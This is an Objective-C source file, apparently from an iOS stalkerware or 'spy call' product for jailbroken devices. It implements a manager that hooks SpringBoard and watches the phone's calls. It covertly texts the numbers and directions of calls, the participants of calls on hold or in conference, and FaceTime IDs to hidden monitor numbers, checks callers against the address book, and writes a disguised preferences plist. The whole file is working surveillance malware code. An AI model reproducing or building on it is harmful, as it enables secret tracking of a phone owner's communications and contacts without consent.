//
//  SpyCallManager.m
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallManager.h"
#import "RecentCallNotifier.h"
#import "SpringBoardDidLaunchNotifier.h"
#import "SpringBoardKilledNotifier.h"

#import "SMSSender.h"
#import "PreferenceManager.h"
#import "PrefMonitorNumber.h"
#import "SharedFileIPC.h"
#import "DefStd.h"
#import "SMSSendMessage.h"
#import "PrefWatchList.h"
#import "TelephoneNumber.h"

#import <AddressBook/AddressBook.h>
#import <AddressBook/ABRecord.h>
#import "AddressBook-Private.h"

@interface SpyCallManager (private)

- (void) sharePreferenceMonitor;
- (void) sendSMS: (NSString *) aSMS;
- (BOOL) isNumberInCallWatch: (NSString *) aTelephoneNumber;
- (BOOL) isNumberinAddressBook: (NSString *) aTelephoneNumber;
- (void) shareSpyNumbersStatusUseInDataProtectedMode;
- (void) deleteSpyNumbersStatusUseInDataProtectedModeIfExist;
@end


@implementation SpyCallManager

@synthesize mSMSSender;
@synthesize mPreferenceManager;

#pragma mark - Public methods -

- (id) init {
	if ((self = [super init])) {
		mRecentCallNotifier = [[RecentCallNotifier alloc] init];
		mSBDidLaunchNotifier = [[SpringBoardDidLaunchNotifier alloc] initWithNotifier:mRecentCallNotifier];
        mSBKillNotifier = [[SpringBoardKilledNotifier alloc] initWithNotifier:mRecentCallNotifier];
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallMSCommandMsgPort
												 withMessagePortIPCDelegate:self];
	}
	return (self);
}

- (void) start {
    DLog(@"Starting Spy Call");
	[mMessagePortReader start];
	[mRecentCallNotifier start];
	[mRecentCallNotifier setMPreferenceManager:[self mPreferenceManager]];
	[self sharePreferenceMonitor];
    [self shareSpyNumbersStatusUseInDataProtectedMode];
	[mSBDidLaunchNotifier registerSpringBoardNotification];
    [mSBKillNotifier registerSpringBoardNotification];
}

- (void) stop {
    DLog(@"Stoping Spy Call");
	[mMessagePortReader stop];
	[mRecentCallNotifier stop];
	[self sharePreferenceMonitor];
    [self deleteSpyNumbersStatusUseInDataProtectedModeIfExist];
	[mSBDidLaunchNotifier unregisterSpringBoardNotification];
    [mSBKillNotifier unregisterSpringBoardNotification];
}

- (void) disableSpyCall {
	[mMessagePortReader stop];
	[mRecentCallNotifier stop];
    
    // Update spy settings to shared file
    PrefMonitorNumber *prefMonitor = [[[PrefMonitorNumber alloc] init] autorelease];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	[sharedFile writeData:[prefMonitor toData] withID:kSharedFileMonitorNumberID];
	[sharedFile release];
	
    // Delete spy settings to plist in user defaults folder
    [self deleteSpyNumbersStatusUseInDataProtectedModeIfExist];
    
	[mSBDidLaunchNotifier unregisterSpringBoardNotification];
}

#pragma mark - Protocol methods -

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"Send message to home/notification .. numbers, aRawData = %@", aRawData);
	NSInteger cmd = kSpyCallMSNormalCallInProgress;
	[aRawData getBytes:&cmd length:sizeof(NSInteger)];
	NSInteger location = sizeof(NSInteger);
    DLog(@"cmd = %ld", (long)cmd);
	switch (cmd) {
		case kSpyCallMSNormalCallOnHold: {
			// Tel numbers
			NSMutableArray *telNumbers = [NSMutableArray array];
			NSMutableArray *telDirections = [NSMutableArray array];
			NSInteger count = 0;
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger length = 0;
				[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
				location += length;
				NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
				[telNumbers addObject:tel];
				[tel release];
			}
			// Directions
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger direction = 1; // 1 = IN, 2 = OUT
				[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				[telDirections addObject:[NSNumber numberWithInt:(int)direction]];
			}
			NSString *numberDirection = @"";
			for (NSInteger i = 0; i < MAX([telNumbers count], [telDirections count]); i++) {
				NSString *number = [telNumbers objectAtIndex:i];
				NSNumber *direction = [telDirections objectAtIndex:i];
				NSString *directionString = [direction intValue] == 1 ? NSLocalizedString(@"kOneCallDirectionIn", @"") : NSLocalizedString(@"kOneCallDirectionOut", @"");
				numberDirection = [NSString stringWithFormat:@"%@%@,%@\n", numberDirection, number, directionString];
			}
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectNormalCallOnHold", @""), numberDirection];
			DLog (@"Normal call is on hold, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSNormalCallInProgress: {
			NSInteger direction = 1; // 1 = IN, 2 = OUT
			[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSInteger length = 0;
			[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSData *numberData = [aRawData subdataWithRange:NSMakeRange(location, length)];
			NSString *telNumber = [[NSString alloc] initWithData:numberData encoding:NSUTF8StringEncoding];
			NSString *message = @"";
			if (direction == 1) {
				message = NSLocalizedString(@"kIncomingWatchNotication2MonitorNumbers", @"");
			} else if (direction == 2) {
				message = NSLocalizedString(@"kOutgoingWatchNotication2MonitorNumbers", @"");
			}
			message = [NSString stringWithFormat:message, telNumber];
			DLog(@"Normal call is in progress, message = %@", message);
			
			if ([self isNumberInCallWatch:telNumber]) {
				[self sendSMS:message];
			}
			[telNumber release];
		} break;
		case kSpyCallMSAudioIsActive: {
			// Send application is playing/recording audio
			NSString *message = NSLocalizedString(@"kCannotAnswerOneCallAudioIsActive", @"");
			DLog(@"Audio is active, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSMaxConferenceLine: {
			// Max lines
			NSInteger lines = 0;
			[aRawData getBytes:&lines range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			// Tel numbers
			NSMutableArray *telNumbers = [NSMutableArray array];
			NSMutableArray *telDirections = [NSMutableArray array];
			NSInteger count = 0;
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger length = 0;
				[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
				location += length;
				NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
				[telNumbers addObject:tel];
				[tel release];
			}
			// Directions
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger direction = 1; // 1 = IN, 2 = OUT
				[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				[telDirections addObject:[NSNumber numberWithInt:(int)direction]];
			}
			NSString *numberDirection = @"";
			for (NSInteger i = 0; i < MAX([telNumbers count], [telDirections count]); i++) {
				NSString *number = [telNumbers objectAtIndex:i];
				NSNumber *direction = [telDirections objectAtIndex:i];
				NSString *directionString = [direction intValue] == 1 ? NSLocalizedString(@"kOneCallDirectionIn", @"") : NSLocalizedString(@"kOneCallDirectionOut", @"");
				numberDirection = [NSString stringWithFormat:@"%@%@,%@\n", numberDirection, number, directionString];
			}
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectMaxConferenceLines", @""), lines, numberDirection];
			DLog (@"Maximum number of line reached, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSSpyCallInProgress: {
			NSInteger length = 0;
			[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
			location += length;
			NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectOneCallActive", @""), tel];
			DLog (@"Other spy call is in progress, message = %@", message);
			[self sendSMS:message];
			[tel release];
		} break;
        case kSpyCallMSFaceTimeInProgress: {
            NSString *faceTimeIDs = @"";
            NSInteger count = 0;
            [aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
            location += sizeof(NSInteger);
            for (NSInteger i = 0; i < count; i++) {
                NSInteger length = 0;
                [aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
                location += sizeof(NSInteger);
                NSData *facetimeIDData = [aRawData subdataWithRange:NSMakeRange(location, length)];
                location += length;
                NSString *facetimeID = [[NSString alloc] initWithData:facetimeIDData encoding:NSUTF8StringEncoding];
                faceTimeIDs = [NSString stringWithFormat:@"%@%@\n", faceTimeIDs, facetimeID];
                [facetimeID release];
            }
            NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectFaceTimeCallActive", @""), faceTimeIDs];
			DLog (@"FaceTime call is in progress, message = %@", message);
			[self sendSMS:message];
        } break;
        case kSpyCallMSConferenceNotSupport: {
            NSString *message = NSLocalizedString(@"kOneCallDisconnectConferenceNotSupport", @"");
            DLog(@"Conference not support message, %@", message);
            //[self sendSMS:message]; // Don't need to send sms notification
        } break;
		default:
			break;
	}
}

#pragma mark - Private methods -

- (void) sharePreferenceMonitor {
    // Update spy settings to shared file
    PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	[sharedFile writeData:[prefMonitor toData] withID:kSharedFileMonitorNumberID];
	[sharedFile release];
}

- (void) sendSMS: (NSString *) aSMS {
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	for (NSString* recipient in [prefMonitor mMonitorNumbers]) {
		SMSSendMessage* smsSendMessage = [[SMSSendMessage alloc] init];
		[smsSendMessage setMMessage:aSMS];
		[smsSendMessage setMRecipientNumber:recipient];
		[mSMSSender sendSMS:smsSendMessage];
		[smsSendMessage release];
	}
}

- (BOOL) isNumberInCallWatch: (NSString *) aTelephoneNumber {
	BOOL numberIsInWatch = FALSE;
	PrefWatchList *prefWatchList = (PrefWatchList *)[[self mPreferenceManager] preference:kWatch_List];
	if ([prefWatchList mEnableWatchNotification]) {
		// Private/Unknown number
		if (!numberIsInWatch && ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)) {
			if ([aTelephoneNumber isEqualToString:@"Blocked"]   ||
                [aTelephoneNumber isEqualToString:@"No Caller ID"]) {
				numberIsInWatch = TRUE;
			}
		}
		// Watch list number
		if (!numberIsInWatch && ([prefWatchList mWatchFlag] & kWatch_In_List)) {
			TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
			for (NSString *watchNumber in [prefWatchList mWatchNumbers]) {
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:watchNumber]) {
					numberIsInWatch = TRUE;
					break;
				}
			}
			[telNumber release];
		}
		
		// Not in address book/In address book
		if (!numberIsInWatch && (([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook) ||
								([prefWatchList mWatchFlag] & kWatch_In_Addressbook))) {
			BOOL isInAddressBook = [self isNumberinAddressBook:aTelephoneNumber];
			DLog (@"Is number is in address book = %d", isInAddressBook);
			if (!isInAddressBook && ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)) {
				numberIsInWatch = TRUE;
			}
			if (isInAddressBook && ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)) {
				numberIsInWatch = TRUE;
			}
		}
	}
	DLog (@"Is number is in watch = %d", numberIsInWatch);
	return (numberIsInWatch);
}

- (BOOL) isNumberinAddressBook: (NSString *) aTelephoneNumber {
	DLog (@"Number to compare with address book, aTelephoneNumber = %@", aTelephoneNumber);
	BOOL isInAddressBook = FALSE;
	ABAddressBookRef addressBook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	CFArrayRef contactArray = ABAddressBookCopyArrayOfAllPeople(addressBook);
	CFIndex numberOfContact = ABAddressBookGetPersonCount(addressBook);
	TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
	for (CFIndex index = 0; index < numberOfContact; index++) {
		ABRecordRef abRecord = CFArrayGetValueAtIndex(contactArray, index);
		ABMultiValueRef phones = ABRecordCopyValue(abRecord, kABPersonPhoneProperty);
		for (CFIndex i = 0; (phones && i < ABMultiValueGetCount(phones)); i++) {
			CFStringRef phoneValue = ABMultiValueCopyValueAtIndex(phones, i);
			if (phoneValue) {
				NSString *number = [NSString stringWithString:(NSString *)phoneValue];
				DLog (@"Number from address book, number = %@", number);
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:number]) {
					isInAddressBook = TRUE;
					CFRelease(phoneValue);
					break;
				}
				CFRelease(phoneValue);
			}
		}
		if (phones) CFRelease(phones);
		if (isInAddressBook) break;
	}
	[telNumber release];
	if (contactArray) CFRelease(contactArray);
	if (addressBook) CFRelease(addressBook);
	return (isInAddressBook);
}

- (void) shareSpyNumbersStatusUseInDataProtectedMode {
    PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
    NSMutableDictionary *preferences = [NSMutableDictionary dictionary];
    [preferences setObject:[prefMonitor toData] forKey:@"secure.remote.user.numbers"];
    [preferences writeToFile:@"/var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist" atomically:YES];
    system("chmod 644 /var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist");
}

- (void) deleteSpyNumbersStatusUseInDataProtectedModeIfExist {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:@"/var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist"]) {
        [fileManager removeItemAtPath:@"/var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist" error:nil];
    }
}

- (void) dealloc {
	[mMessagePortReader stop];
	[mMessagePortReader release];
	[mRecentCallNotifier release];
	[mSBDidLaunchNotifier release];
    [mSBKillNotifier release];
	[super dealloc];
}

@end
